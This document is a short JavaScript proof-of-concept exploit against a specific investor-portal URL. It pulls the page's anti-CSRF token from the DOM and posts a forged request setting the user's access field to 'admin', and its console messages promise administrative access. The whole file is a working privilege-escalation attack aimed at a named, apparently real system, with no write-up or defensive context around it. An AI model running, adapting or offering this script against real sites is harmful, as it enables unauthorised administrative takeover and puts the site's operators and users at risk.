//BEGIN
console.log("Initiating exploit...");

var priveEscTarget = "https://investorportal.ispt.net.au/user/updateField/1559";
console.log("Targetting: " + priveEscTarget);
console.log(" ");
console.log("Reading response to extract anti-CSRF token...");
var extract = document.querySelector('input[name=_token]').value;
console.log("Token extracted successfully: " + extract);
console.log(" ");

function bypassCSRF() {
  console.log("Instantiating XMLHttpRequest...");
  //instantiating XMLHttpRequest
  var poc = new XMLHttpRequest();
  console.log("Parsing token to XHR to bypass CSRF protection and assigning payload...");
  poc.open("POST", priveEscTarget); 
  poc.setRequestHeader("X-CSRF-TOKEN", extract);
  var fd = new FormData();
  fd.append('access', 'admin');
  poc.send(fd);
  console.log("CSRF request sent with header");
  console.log(" ");
  console.log("Exploit completed! You should now have Administrative access!");
  console.log(" ");
}

bypassCSRF();
//EOF
